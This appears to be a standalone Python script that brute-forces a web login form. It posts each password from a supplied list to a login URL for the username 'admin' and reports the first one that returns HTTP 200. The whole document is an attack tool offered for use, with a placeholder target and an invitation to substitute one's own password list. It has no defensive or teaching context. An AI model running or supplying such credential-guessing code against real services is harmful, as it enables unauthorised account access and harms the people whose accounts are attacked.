import requests

def brute_force_login(url, username, password_list):
    for password in password_list:
        response = requests.post(url, data={'username': username, 'password': password})
        if response.status_code == 200:
            print(f"Login successful - Username: {username}, Password: {password}")
            break
        else:
            print(f"Login failed - Username: {username}, Password: {password}")

# Example usage
url = 'https://example.com/login'
username = 'admin'
password_list = ['password1', 'password2', 'password3']  # Replace with your own password list

brute_force_login(url, username, password_list)
